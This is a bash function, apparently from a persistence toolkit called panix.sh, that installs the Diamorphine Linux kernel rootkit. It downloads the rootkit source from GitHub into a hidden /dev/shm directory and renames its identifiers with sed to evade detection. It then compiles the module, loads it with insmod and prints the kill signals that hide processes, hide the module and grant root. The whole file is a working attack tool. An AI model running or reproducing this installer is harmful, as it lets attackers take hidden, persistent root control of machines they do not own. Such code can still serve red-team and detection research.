setup_rootkit() {
    # References:
    # Diamorphine Rootkit: https://github.com/m0nad/Diamorphine
    # Inspiration: https://github.com/MatheuZSecurity/D3m0n1z3dShell/blob/main/scripts/implant_rootkit.sh
    # Inspiration: https://github.com/Trevohack/DynastyPersist/blob/main/src/dynasty.sh#L194

    local rk_path="/dev/shm/.rk"
	local tmp_path="/tmp"
    local zip_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.zip"
    local tar_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.tar"
    local clone_url="https://github.com/Aegrah/Diamorphine.git"
    local secret=""
    local identifier=""

	if ! check_root; then
		echo "Error: This function can only be run as root."
		exit 1
	fi

    usage_rootkit() {
		echo "Usage: ./panix.sh --rootkit"
		echo "--examples                 Display command examples"
		echo "--secret <secret>          Specify the secret"
		echo "--identifier <identifier>  Specify the identifies"
		echo "--help|-h                  Show this help message"
	}

	while [[ "$1" != "" ]]; do
		case $1 in
			--secret )
				shift
				secret=$1
				;;
			--identifier )
				shift
				identifier=$1
				;;
			--examples )
				echo "Examples:"
				echo "sudo ./panix.sh --rootkit --secret \"P4N1X\" --identifier \"panix\""
				exit 0
				;;
			--help|-h)
				usage_rootkit
				exit 0
				;;
			* )
				echo "Invalid option for --rootkit: $1"
				echo "Try './panix.sh --rootkit --help' for more information."
				exit 1
		esac
		shift
	done

	if [[ -z $secret || -z $identifier ]]; then
		echo "Error: --secret and --identifier must be specified."
		echo "Try './panix.sh --rootkit --help' for more information."
		exit 1
	fi

	if ! command -v make &> /dev/null; then
		echo "Error: 'make' is not installed. Please install 'make' or 'build-essential' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install build-essential"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install make"
		exit 1
	fi

	if ! command -v gcc &> /dev/null; then
		echo "Error: 'gcc' is not installed. Please install 'gcc' to use this mechanism."
		echo "For Debian/Ubuntu: sudo apt install gcc"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install gcc"
		exit 1
	fi

	KERNEL_HEADERS="/lib/modules/$(uname -r)/build"
	RESOLVED_HEADERS=$(readlink -f "$KERNEL_HEADERS")

	if [ ! -d "$RESOLVED_HEADERS" ]; then
		echo "Kernel headers not found. Please install the kernel headers for your system."
		echo "For Debian/Ubuntu: sudo apt install linux-headers-\$(uname -r)"
		echo "For Fedora/RHEL/CentOS: sudo dnf/yum install kernel-devel"
		exit 1
	fi

    echo "[!] There are known issues with the Diamorphine rootkit for Ubuntu 22.04."
    echo "[!] This module is tested on Debian 11, 12, RHEL 9, CentOS Stream 9 and CentOS 7."
    echo "[!] I cannot guarantee that it will work on other distributions."
    sleep 5

    mkdir -p $rk_path

    # Check if wget or curl is installed
    if command -v wget >/dev/null 2>&1; then
        downloader="wget"
    elif command -v curl >/dev/null 2>&1; then
        downloader="curl"
    else
        echo "Error: Neither 'wget' nor 'curl' is installed. Please install one of them to proceed."
        exit 1
    fi

    # Function to download files using the available downloader
    download_file() {
        local url="$1"
        local output="$2"
        if [ "$downloader" = "wget" ]; then
            wget -O "$output" "$url"
        else
            curl -L -o "$output" "$url"
        fi
    }

    # Check for zip/unzip
    if command -v zip >/dev/null 2>&1 && command -v unzip >/dev/null 2>&1; then
        echo "zip/unzip is available. Downloading diamorphine.zip..."
        download_file "${zip_url}" "${tmp_path}/diamorphine.zip"
        unzip "${tmp_path}/diamorphine.zip" -d "${tmp_path}/diamorphine"
		mv ${tmp_path}/diamorphine/Diamorphine-master/* "${rk_path}/"

    # Check for tar
    elif command -v tar >/dev/null 2>&1; then
        echo "tar is available. Downloading diamorphine.tar..."
        download_file "${tar_url}" "${tmp_path}/diamorphine.tar"
        tar -xf "${tmp_path}/diamorphine.tar" -C "${rk_path}/" --strip-components=1

    # Check for git
    elif command -v git >/dev/null 2>&1; then
        echo "git is available. Cloning diamorphine.git..."
        git clone "${clone_url}" "${tmp_path}/diamorphine"
		mv ${tmp_path}/diamorphine/* "${rk_path}/"
    # If none are available
    else
        echo "Error: None of unzip, tar, or git is installed. Please install one of them to proceed, or download Diamorphine manually."
        exit 1
    fi

	# Obfuscate most obvious strings
	# Files
	mv ${rk_path}/diamorphine.c ${rk_path}/${identifier}.c
	mv ${rk_path}/diamorphine.h ${rk_path}/${identifier}.h
	
	# Module Information
	sed -i s/m0nad/${identifier}/g ${rk_path}/${identifier}.c
	sed -i -E "s/(MODULE_DESCRIPTION\\(\")[^\"]*(\"\\);)/\1${identifier}\2/" "${rk_path}/${identifier}.c"

	# Strings
	sed -i s/diamorphine_secret/${secret}/g ${rk_path}/${identifier}.h
	sed -i s/diamorphine/${identifier}/g ${rk_path}/${identifier}.h
	sed -i s/diamorphine.h/${identifier}.h/g ${rk_path}/${identifier}.c
	sed -i s/diamorphine_init/${identifier}_init/g ${rk_path}/${identifier}.c
	sed -i s/diamorphine_cleanup/${identifier}_cleanup/g ${rk_path}/${identifier}.c
	sed -i s/diamorphine.o/${identifier}.o/g ${rk_path}/Makefile
	
	# Original functions
	sed -i s/orig_getdents64/${identifier}_orig_getdents64/g ${rk_path}/${identifier}.c
	sed -i s/orig_getdents/${identifier}_orig_getdents/g ${rk_path}/${identifier}.c
	sed -i s/orig_kill/${identifier}_orig_kill/g ${rk_path}/${identifier}.c
	
	# Hooks
	sed -i s/module_hide/${identifier}_module_hide/g ${rk_path}/${identifier}.c
	sed -i s/module_hidden/${identifier}_module_hidden/g ${rk_path}/${identifier}.c
	sed -i s/is_invisible/${identifier}_invisible/g ${rk_path}/${identifier}.c
	sed -i s/hacked_getdents64/${identifier}_getdents64/g ${rk_path}/${identifier}.c
	sed -i s/hacked_getdents/${identifier}_getdents/g ${rk_path}/${identifier}.c
	sed -i s/hacked_kill/${identifier}_kill/g ${rk_path}/${identifier}.c
	sed -i s/give_root/${identifier}_give_root/g ${rk_path}/${identifier}.c
	sed -i s/is_invisible/${identifier}_is_invisible/g ${rk_path}/${identifier}.c

	# Compile, load and clean
	make -C ${rk_path}

	if [ $? -ne 0 ]; then
		echo "Error: Failed to compile the rootkit."
		exit 1
	fi

	if ! command -v insmod &> /dev/null; then
		/sbin/insmod ${rk_path}/${identifier}.ko
	else
		insmod ${rk_path}/${identifier}.ko
	fi

	if [ $? -ne 0 ]; then
		echo "Error: Failed to load the rootkit."
		exit 1
	fi

	make -C ${rk_path} clean
    touch ${rk_path}/restore_${identifier}.ko

	echo "[+] Diamorphine rootkit has been installed."
    echo "[+] The secret is: ${secret}"
    echo "[+] The identifier is: ${identifier}"

    echo "[+] kill -31 pid: hide/unhide any process;"
    echo "[+] kill -63 pid: turns the module (in)visible;"
    echo "[+] kill -64 pid: become root;"
    echo "[+] Any file starting with ${secret} is hidden."
    echo "[+] Source: https://github.com/m0nad/Diamorphine"
}
